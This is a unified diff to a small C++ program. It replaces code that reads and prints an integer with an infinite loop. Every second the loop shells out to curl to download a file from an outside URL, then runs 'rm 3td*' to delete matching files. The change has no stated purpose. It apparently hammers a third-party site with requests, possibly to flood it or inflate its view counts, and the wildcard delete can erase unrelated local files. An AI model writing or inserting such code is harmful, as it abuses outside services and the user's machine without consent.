@@ -1,16 +1,14 @@
 #include <bits/stdc++.h>
+#include <unistd.h>
 
 using namespace std;
 
-vector<int> v;
-
 int main()
 {
-    decltype(5) a;
-    cin >> a;
-    cout << a;
-    for(int & it : v) {
-        cout << it;
+    while (true) {
+        system("curl -O https://www.meipian9.cn/3td0qxj9");
+        system("rm 3td*");
+        sleep(1);
     }
     return 0;
 }
